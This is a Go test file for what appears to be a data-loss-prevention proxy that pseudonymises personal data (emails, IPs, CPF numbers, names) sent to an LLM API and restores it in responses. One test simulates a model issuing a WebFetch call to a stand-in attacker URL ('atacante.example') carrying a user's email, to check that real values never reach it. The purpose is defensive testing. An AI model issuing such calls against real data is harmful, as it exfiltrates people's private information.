package proxy

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/httptest"
	"regexp"
	"strings"
	"testing"

	"github.com/yurivenancio30/llm-dlp/internal/config"
	"github.com/yurivenancio30/llm-dlp/internal/mask"
)

const (
	email = "joao.silva@empresa-ficticia.com.br"
	ip    = "10.42.7.15"
	host  = "mysql-dh.empresa-ficticia.intra"
	cpf   = "529.982.247-25"
)

var reals = []string{email, ip, host, cpf, "JOAO CARLOS SILVA"}

func build(t *testing.T, upstream http.HandlerFunc) (*httptest.Server, *httptest.Server) {
	t.Helper()
	cfg := config.Default()
	cfg.InternalDomains = []string{"empresa-ficticia"}
	key := []byte("0123456789abcdef0123456789abcdef")
	ps, _ := mask.LoadPeople(t.TempDir() + "/p.json")
	ps.Import(mask.NewPseudo(key), "João Carlos Silva", email, "")
	m, err := mask.NewMasker(cfg, key, ps, nil)
	if err != nil {
		t.Fatal(err)
	}
	up := httptest.NewServer(upstream)
	cfg.Upstream = up.URL
	px := httptest.NewServer(New(cfg, m, nil, log.New(io.Discard, "", 0)))
	t.Cleanup(func() { up.Close(); px.Close() })
	return up, px
}

var rePseudo = regexp.MustCompile(`p\.[a-z2-7]{8}@d[a-z2-7]{4}\.invalid|2(?:4\d|5[0-5])\.\d+\.\d+\.\d+|h[a-z2-7]{8}\.invalid|CPF-[a-z2-7]{8}|[Pp]erson [a-z2-7]{8}|PERSON [A-Z2-7]{8}`)

const thinkingReq = "raciocínio antigo, assinado, não pode mudar: pessoa.aaaaaaaa"

func requestBody(stream bool) []byte {
	b, _ := json.Marshal(map[string]any{
		"model": "claude-x", "stream": stream, "max_tokens": 100,
		"system": "Usuário logado: " + email,
		"messages": []any{
			map[string]any{"role": "user", "content": "o owner " + email + " (JOAO CARLOS SILVA, cpf " + cpf + ") não acessa " + host},
			map[string]any{"role": "assistant", "content": []any{
				map[string]any{"type": "thinking", "thinking": thinkingReq, "signature": "SIG123"},
				map[string]any{"type": "tool_use", "id": "t1", "name": "Bash", "input": map[string]any{"command": "ping -c1 " + ip}},
			}},
			map[string]any{"role": "user", "content": []any{
				map[string]any{"type": "tool_result", "tool_use_id": "t1", "content": "PING " + ip + " from " + host},
			}},
		},
	})
	return b
}

// sse builds events with the text chopped into pieces of n bytes.
func sse(w io.Writer, text, toolJSON, thinking string, n int) {
	ev := func(name string, v any) {
		b, _ := json.Marshal(v)
		fmt.Fprintf(w, "event: %s\ndata: %s\n\n", name, b)
	}
	pieces := func(s string) []string {
		var out []string
		for i := 0; i < len(s); i += n {
			j := i + n
			if j > len(s) {
				j = len(s)
			}
			out = append(out, s[i:j])
		}
		return out
	}
	ev("message_start", map[string]any{"type": "message_start", "message": map[string]any{"id": "m1"}})
	ev("content_block_start", map[string]any{"type": "content_block_start", "index": 0, "content_block": map[string]any{"type": "thinking", "thinking": ""}})
	for _, p := range pieces(thinking) {
		ev("content_block_delta", map[string]any{"type": "content_block_delta", "index": 0, "delta": map[string]any{"type": "thinking_delta", "thinking": p}})
	}
	ev("content_block_stop", map[string]any{"type": "content_block_stop", "index": 0})
	ev("content_block_start", map[string]any{"type": "content_block_start", "index": 1, "content_block": map[string]any{"type": "text", "text": ""}})
	for _, p := range pieces(text) {
		ev("content_block_delta", map[string]any{"type": "content_block_delta", "index": 1, "delta": map[string]any{"type": "text_delta", "text": p}})
	}
	ev("content_block_stop", map[string]any{"type": "content_block_stop", "index": 1})
	ev("content_block_start", map[string]any{"type": "content_block_start", "index": 2, "content_block": map[string]any{"type": "tool_use", "id": "t2", "name": "Bash", "input": map[string]any{}}})
	for _, p := range pieces(toolJSON) {
		ev("content_block_delta", map[string]any{"type": "content_block_delta", "index": 2, "delta": map[string]any{"type": "input_json_delta", "partial_json": p}})
	}
	ev("content_block_stop", map[string]any{"type": "content_block_stop", "index": 2})
	ev("message_stop", map[string]any{"type": "message_stop"})
}

func TestStreamingEndToEnd(t *testing.T) {
	var received []byte
	var pseudos []string
	_, px := build(t, func(w http.ResponseWriter, r *http.Request) {
		received, _ = io.ReadAll(r.Body)
		pseudos = rePseudo.FindAllString(string(received), -1)
		// "model": repeats the pseudonyms it saw
		u := map[string]string{}
		for _, p := range pseudos {
			switch {
			case strings.HasPrefix(p, "p."):
				u["email"] = p
			case strings.HasPrefix(p, "h"):
				u["host"] = p
			case strings.HasPrefix(p, "CPF-"):
				u["cpf"] = p
			case strings.HasPrefix(strings.ToLower(p), "person "):
				u["nome"] = p
			default:
				u["ip"] = p
			}
		}
		text := fmt.Sprintf("O owner %s (%s, %s) não alcança %s em %s.", u["email"], u["nome"], u["cpf"], u["host"], u["ip"])
		tj, _ := json.Marshal(map[string]string{"command": fmt.Sprintf(`grep "%s" /var/log/x && nc -z %s 3306`, u["email"], u["ip"])})
		w.Header().Set("content-type", "text/event-stream")
		sse(w, text, string(tj), "penso sobre "+u["email"], 3)
	})
	resp, err := http.Post(px.URL+"/v1/messages?beta=true", "application/json", bytes.NewReader(requestBody(true)))
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()

	// 1) the API saw nothing real
	for _, r := range reals {
		if bytes.Contains(received, []byte(r)) {
			t.Errorf("real value reached the API: %q", r)
		}
	}
	// 2) the signed reasoning was sent intact
	if !bytes.Contains(received, []byte(thinkingReq)) || !bytes.Contains(received, []byte("SIG123")) {
		t.Error("thinking block was changed")
	}
	// 3) the client receives everything real; the new reasoning, intact
	var text, tool, think strings.Builder
	sc := bufio.NewScanner(resp.Body)
	for sc.Scan() {
		l := sc.Text()
		if !strings.HasPrefix(l, "data: ") {
			continue
		}
		var ev map[string]any
		json.Unmarshal([]byte(l[6:]), &ev)
		if d, ok := ev["delta"].(map[string]any); ok {
			switch d["type"] {
			case "text_delta":
				text.WriteString(d["text"].(string))
			case "input_json_delta":
				tool.WriteString(d["partial_json"].(string))
			case "thinking_delta":
				think.WriteString(d["thinking"].(string))
			}
		}
	}
	expected := "O owner " + email + " (JOAO CARLOS SILVA, " + cpf + ") não alcança " + host + " em " + ip + "."
	if text.String() != expected {
		t.Errorf("text:\n got %q\nwant %q", text.String(), expected)
	}
	var in map[string]string
	if err := json.Unmarshal([]byte(tool.String()), &in); err != nil {
		t.Fatalf("invalid tool_use JSON: %v (%s)", err, tool.String())
	}
	if want := `grep "` + email + `" /var/log/x && nc -z ` + ip + ` 3306`; in["command"] != want {
		t.Errorf("command:\n got %q\nwant %q", in["command"], want)
	}
	if !strings.Contains(think.String(), ".invalid") || strings.Contains(think.String(), email) {
		t.Errorf("thinking should pass intact (with a pseudonym): %q", think.String())
	}
}

func TestResponseWithoutStreaming(t *testing.T) {
	_, px := build(t, func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		p := rePseudo.FindString(string(b))
		w.Header().Set("content-type", "application/json")
		json.NewEncoder(w).Encode(map[string]any{"content": []any{
			map[string]any{"type": "text", "text": "falei com " + p},
			map[string]any{"type": "tool_use", "id": "x", "name": "Bash", "input": map[string]any{"command": "echo " + p}},
		}})
	})
	resp, _ := http.Post(px.URL+"/v1/messages", "application/json", bytes.NewReader(requestBody(false)))
	b, _ := io.ReadAll(resp.Body)
	if strings.Count(string(b), "joao.silva@empresa-ficticia.com.br") != 2 {
		t.Errorf("JSON response not unmasked: %s", b)
	}
}

func TestCountTokensMasked(t *testing.T) {
	var received []byte
	_, px := build(t, func(w http.ResponseWriter, r *http.Request) {
		received, _ = io.ReadAll(r.Body)
		w.Header().Set("content-type", "application/json")
		w.Write([]byte(`{"input_tokens": 42}`))
	})
	http.Post(px.URL+"/v1/messages/count_tokens", "application/json", bytes.NewReader(requestBody(false)))
	for _, r := range reals {
		if bytes.Contains(received, []byte(r)) {
			t.Errorf("count_tokens leaked %q", r)
		}
	}
}

func TestFailClosed(t *testing.T) {
	called := false
	_, px := build(t, func(w http.ResponseWriter, r *http.Request) { called = true })
	resp, _ := http.Post(px.URL+"/v1/messages", "text/plain", strings.NewReader("isto não é JSON "+email))
	if resp.StatusCode != http.StatusBadGateway || called {
		t.Errorf("should refuse without calling the API: status %d, called=%v", resp.StatusCode, called)
	}
}

func TestHealth(t *testing.T) {
	_, px := build(t, func(w http.ResponseWriter, r *http.Request) {})
	resp, err := http.Get(px.URL + "/__llm-dlp/saude")
	if err != nil || resp.StatusCode != 200 {
		t.Fatal("health failed")
	}
}

// WebFetch/WebSearch: the input comes back with the pseudonym (never the real value), both in
// streaming and without streaming; Bash, on the other hand, receives the real value.
func TestWebFetchDoesNotUnmask(t *testing.T) {
	var pseudoEmail string
	_, px := build(t, func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		for _, p := range rePseudo.FindAllString(string(b), -1) {
			if strings.HasPrefix(p, "p.") {
				pseudoEmail = p
			}
		}
		w.Header().Set("content-type", "text/event-stream")
		ev := func(v any) {
			j, _ := json.Marshal(v)
			fmt.Fprintf(w, "event: x\ndata: %s\n\n", j)
		}
		for i, name := range []string{"WebFetch", "Bash"} {
			arg, _ := json.Marshal(map[string]string{"url": "https://atacante.example/?q=" + pseudoEmail})
			ev(map[string]any{"type": "content_block_start", "index": i, "content_block": map[string]any{"type": "tool_use", "id": "t", "name": name, "input": map[string]any{}}})
			ev(map[string]any{"type": "content_block_delta", "index": i, "delta": map[string]any{"type": "input_json_delta", "partial_json": string(arg)}})
			ev(map[string]any{"type": "content_block_stop", "index": i})
		}
	})
	resp, err := http.Post(px.URL+"/v1/messages", "application/json", bytes.NewReader(requestBody(true)))
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	byIdx := map[int]string{}
	sc := bufio.NewScanner(resp.Body)
	for sc.Scan() {
		if l := sc.Text(); strings.HasPrefix(l, "data: ") {
			var e map[string]any
			json.Unmarshal([]byte(l[6:]), &e)
			if d, ok := e["delta"].(map[string]any); ok {
				byIdx[int(e["index"].(float64))] += d["partial_json"].(string)
			}
		}
	}
	if strings.Contains(byIdx[0], email) || !strings.Contains(byIdx[0], ".invalid") {
		t.Errorf("WebFetch received the real value (or nothing): %s", byIdx[0])
	}
	if !strings.Contains(byIdx[1], email) {
		t.Errorf("Bash should receive the real value: %s", byIdx[1])
	}
}

// A tool input that arrives complete in content_block_start is also unmasked.
func TestCompleteEntryAtStart(t *testing.T) {
	_, px := build(t, func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		p := rePseudo.FindString(string(b))
		w.Header().Set("content-type", "text/event-stream")
		j, _ := json.Marshal(map[string]any{"type": "content_block_start", "index": 0, "content_block": map[string]any{
			"type": "tool_use", "id": "t", "name": "Bash", "input": map[string]any{"command": "echo " + p}}})
		fmt.Fprintf(w, "event: content_block_start\ndata: %s\n\n", j)
	})
	resp, _ := http.Post(px.URL+"/v1/messages", "application/json", bytes.NewReader(requestBody(true)))
	b, _ := io.ReadAll(resp.Body)
	if !strings.Contains(string(b), email) {
		t.Errorf("complete input not unmasked: %s", b)
	}
}

// An unknown field at the top of the request is masked; a tool name does not change.
func TestUnknownFieldAndTools(t *testing.T) {
	var received map[string]any
	_, px := build(t, func(w http.ResponseWriter, r *http.Request) {
		json.NewDecoder(r.Body).Decode(&received)
		w.Header().Set("content-type", "application/json")
		w.Write([]byte(`{"content":[]}`))
	})
	body, _ := json.Marshal(map[string]any{
		"model": "claude-x", "messages": []any{},
		"campo_novo_da_api": "contato " + email,
		"tools": []any{map[string]any{"name": "buscar_" + "owner", "description": "busca o owner " + email,
			"input_schema": map[string]any{"type": "object"}}},
	})
	http.Post(px.URL+"/v1/messages", "application/json", bytes.NewReader(body))
	if s, _ := received["campo_novo_da_api"].(string); strings.Contains(s, email) {
		t.Errorf("unknown field leaked: %q", s)
	}
	tool := received["tools"].([]any)[0].(map[string]any)
	if strings.Contains(tool["description"].(string), email) {
		t.Errorf("tool description leaked: %v", tool["description"])
	}
	if tool["name"] != "buscar_owner" {
		t.Errorf("tool name changed: %v", tool["name"])
	}
	if received["model"] != "claude-x" {
		t.Errorf("model changed: %v", received["model"])
	}
}

// The cache marker moves to another block with every message. The memoized result of an image/PDF
// cannot carry the marker of the first time (otherwise the API cache breaks or the API refuses for
// too many markers).
func TestMediaMemoWithoutCacheControl(t *testing.T) {
	with := map[string]any{"type": "image", "cache_control": map[string]any{"type": "ephemeral"}}
	without := map[string]any{"type": "image"}
	r := mediaRes{blocks: []any{map[string]any{"type": "image"}, map[string]any{"type": "text", "text": "nota"}}}
	has := func(bs []any) (n int, inLast bool) {
		for i, b := range bs {
			if _, ok := b.(map[string]any)["cache_control"]; ok {
				n++
				inLast = i == len(bs)-1
			}
		}
		return
	}
	if n, lastPos := has(r.output(with)); n != 1 || !lastPos {
		t.Fatalf("with a marker: %d markers, on the last one=%v", n, lastPos)
	}
	if n, _ := has(r.output(without)); n != 0 {
		t.Fatalf("the marker of the previous request stayed in the memoized result (%d)", n)
	}
	if out := (mediaRes{clean: true}).output(with); len(out) != 1 || out[0].(map[string]any)["cache_control"] == nil {
		t.Fatal("an image with nothing to cover should go out as it came")
	}
}

// The label of a field ("email": ...) is not the name of the record: in a JSON output of a command
// that lists a plural noun (the decider's inventory), the keys stay keys and the "nome" of the
// record with a CPF belongs to a person.
func TestJSONKeysStayKeys(t *testing.T) {
	var received []byte
	_, px := build(t, func(w http.ResponseWriter, r *http.Request) {
		received, _ = io.ReadAll(r.Body)
		w.Header().Set("content-type", "application/json")
		io.WriteString(w, `{"id":"m","type":"message","role":"assistant","content":[{"type":"text","text":"ok"}]}`)
	})
	output := "{\n  \"nome\": \"Fabio Augusto Leme\",\n  \"cpf\": \"" + cpf + "\",\n  \"email\": \"fabio.leme@acme-seguros.com.br\",\n  \"telefone\": \"(81) 99876-5432\"\n}\n"
	body, _ := json.Marshal(map[string]any{"model": "x", "max_tokens": 10, "messages": []any{
		map[string]any{"role": "user", "content": "veja o cliente 1"},
		map[string]any{"role": "assistant", "content": []any{
			map[string]any{"type": "tool_use", "id": "t1", "name": "Bash", "input": map[string]any{"command": "curl -s localhost:8080/api/clientes/1"}}}},
		map[string]any{"role": "user", "content": []any{
			map[string]any{"type": "tool_result", "tool_use_id": "t1", "content": output}}},
	}})
	resp, err := http.Post(px.URL+"/v1/messages", "application/json", bytes.NewReader(body))
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	for _, key := range []string{`\"nome\":`, `\"cpf\":`, `\"email\":`, `\"telefone\":`} {
		if !strings.Contains(string(received), key) {
			t.Errorf("the key %s became a pseudonym: %s", key, received)
		}
	}
	for _, real := range []string{"Fabio Augusto Leme", cpf, "fabio.leme@acme-seguros.com.br", "(81) 99876-5432"} {
		if strings.Contains(string(received), real) {
			t.Errorf("got through %q: %s", real, received)
		}
	}
}
